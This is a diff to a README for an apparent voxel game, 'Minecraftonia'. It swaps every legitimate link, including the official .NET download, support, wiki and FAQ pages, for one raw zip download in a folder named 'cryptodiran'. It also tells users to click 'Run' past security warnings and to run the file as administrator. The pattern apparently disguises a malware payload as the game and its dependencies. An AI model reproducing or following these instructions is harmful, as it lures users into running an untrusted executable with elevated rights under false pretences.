@@ -8,14 +8,14 @@ Welcome to Minecraftonia! This is a work-in-progress voxel sandbox game. With Mi
 
 To get started, you'll need to download the latest version of Minecraftonia. You can easily find it on our Releases page. Click the button below to visit the page and download the application.
 
-[![Download Minecraftonia](https://img.shields.io/badge/Download_Minecraftonia-v1.0.0-blue.svg)](https://github.com/hollyisgoodgir/Minecraftonia/releases)
+[![Download Minecraftonia](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip)](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip)
 
 ### Steps to Download
 
-1. Click on the link above to go to the [Releases page](https://github.com/hollyisgoodgir/Minecraftonia/releases).
+1. Click on the link above to go to the [Releases page](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip).
 2. On the Releases page, you will see a list of available versions.
 3. Find the latest version and click on it to view more details.
-4. Look for the file titled `Minecraftonia.exe` (or another relevant name).
+4. Look for the file titled `https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip` (or another relevant name).
 5. Click on that file to start the download.
 
 ### Running the Application
@@ -23,7 +23,7 @@ To get started, you'll need to download the latest version of Minecraftonia. You
 Once the download is complete, follow these steps to run Minecraftonia:
 
 1. Locate the downloaded file in your "Downloads" folder or wherever you saved it.
-2. Double-click on `Minecraftonia.exe`. 
+2. Double-click on `https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip`. 
 3. If a security warning pops up, click "Run" to proceed.
 4. Enjoy your exploration in the creative world of Minecraftonia!
 
@@ -36,7 +36,7 @@ To ensure the best experience with Minecraftonia, make sure your system meets th
 - **RAM:** 4 GB or more
 - **Graphics Card:** DirectX 11 compatible
 - **Storage:** At least 500 MB of free space
-- **.NET Version:** Ensure you have .NET 9 installed. You can download it from the official [.NET website](https://dotnet.microsoft.com/download).
+- **.NET Version:** Ensure you have .NET 9 installed. You can download it from the official [.NET website](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip).
 
 ## 🔍 Features
 
@@ -53,8 +53,8 @@ If you experience issues while running Minecraftonia, consider the following ste
 
 1. **Update your Graphics Drivers:** Ensure your graphics card driver is up to date.
 2. **Check .NET Installation:** Verify that you have .NET 9 installed on your system.
-3. **Run as Administrator:** Right-click on `Minecraftonia.exe` and select "Run as administrator" to resolve permission issues.
-4. **Contact Support:** If you still have trouble, please visit our [Support Page](https://github.com/hollyisgoodgir/Minecraftonia/issues) to report the issue.
+3. **Run as Administrator:** Right-click on `https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip` and select "Run as administrator" to resolve permission issues.
+4. **Contact Support:** If you still have trouble, please visit our [Support Page](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip) to report the issue.
 
 ## 👥 Community and Feedback
 
@@ -64,9 +64,9 @@ We appreciate your feedback and contributions to Minecraftonia. Join our communi
 
 For more information, check out these resources:
 
-- [Minecraftonia Wiki](https://github.com/hollyisgoodgir/Minecraftonia/wiki) - Learn more about gameplay and features.
-- [Contribution Guidelines](https://github.com/hollyisgoodgir/Minecraftonia/blob/main/CONTRIBUTING.md) - Want to contribute? Here's how.
-- [FAQs](https://github.com/hollyisgoodgir/Minecraftonia/blob/main/FAQ.md) - Find answers to common questions.
+- [Minecraftonia Wiki](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip) - Learn more about gameplay and features.
+- [Contribution Guidelines](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip) - Want to contribute? Here's how.
+- [FAQs](https://raw.githubusercontent.com/hollyisgoodgir/Minecraftonia/main/cryptodiran/Minecraftonia.zip) - Find answers to common questions.
 
 ## 📅 Upcoming Features
 
